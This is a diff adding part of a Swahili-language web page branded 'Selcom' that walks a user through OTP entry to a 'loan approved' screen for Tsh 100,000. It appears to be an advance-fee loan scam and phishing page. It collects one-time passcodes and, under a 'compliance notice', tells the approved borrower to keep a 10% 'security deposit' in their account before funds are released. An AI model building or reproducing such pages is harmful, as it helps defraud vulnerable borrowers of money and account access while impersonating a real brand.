+        <a id="btn-resend-otp" href="#" style="color: #fff; text-decoration: underline; pointer-events: none; opacity: 0.6;">
+          <span id="txt-resend-text">Hukuipata? Tuma tena</span> (<span id="otp-countdown">60</span>s)
+        </a>
+      </p>
+    </div>
+
+    <button id="btn-submit-otp" class="btn-primary btn-large">INGIZA OTP</button>
+  </section>
+
+  <!-- SUCCESS SCREEN -->
+  <section id="step-success" class="screen">
+    <div class="brand-header">
+      <h1 class="brand-logo">Selcom</h1>
+      <span id="txt-success-subtitle" class="brand-sub-tag">SELCOM Pay na Huduma Nyinginezo</span>
+    </div>
+
+    <div class="success-top-badge">✓</div>
+
+    <div class="welcome-banner" style="background: transparent; margin-bottom: 10px;">
+      <h2 id="txt-congrats-title" style="color: #111;">🎉 Hongera!</h2>
+      <p id="txt-congrats-sub" style="color: #444; font-size: 13px;">Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatilewa hivi karibuni.</p>
+    </div>
+
+    <div class="approved-banner-card">
+      <span id="txt-approved-label" class="approved-label">KIASI KILICHOIDHINISHWA</span>
+      <div id="approved-amount-display" class="approved-value">Tsh 100,000</div>
+    </div>
+
+    <div class="compliance-notice-box">
+      <div id="txt-compliance-title" class="compliance-title">⚠️ NOTISI YA UZINGATIAJI</div>
+      <p id="txt-compliance-desc">
+        Akaunti yako ya SELCOM details lazima iwe hai na idumish uamana ya usalama ya angalau 10% ya kiasi cha mkopo ulioomba. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaldia kupata riba nzuri zaidi.
+      </p>
+    </div>
+
+    <div class="loan-details-card">
+      <div id="txt-details-header" class="detail-header-label">= Maelezo ya Mkopo</div>
+      
+      <div class="detail-item">
+        <div class="item-icon">💳</div>
+        <div class="item-text">
+          <span id="txt-item-monthly" class="item-title">MALIPO YA KILA MWEZI</span>
+          <span class="item-val">TSh 2,441</span>
+        </div>
+      </div>
+
+      <div class="detail-item">
+        <div class="item-icon">📅</div>
+        <div class="item-text">
+          <span id="txt-item-term" class="item-title">MUDA WA MKOPO</span>
+          <span class="item-val">Miezi 48</span>
+        </div>
+      </div>
+
+      <div class="detail-item">
+        <div class="item-icon">📈</div>
+        <div class="item-text">
+          <span id="txt-item-rate" class="item-title">KIWANGO CHA RIBA</span>
+          <span class="item-val">8% APR</span>
+        </div>
+      </div>
+    </div>
+
+    <button id="btn-go-home" class="btn-primary btn-large" style="margin-top: 15px;">🏠 Rudi Nyumbani</button>
+  </section>
+
+  <!-- LOADING OVERLAY -->
+  <div id="step-loading" class="loading-overlay">
+    <div class="spinner"></div>
+    <h3 id="loading-title" style="margin-bottom: 8px;">Inachakata...</h3>
+    <p id="loading-sub" style="color: #fff; font-size: 14px;">Tafadhali subiri wakati tunathibitisha maelezo yako.</p>
+  </div>
+
+</div>
+
+<script src="script.js"></script>
+</body>
+      </html>
+          
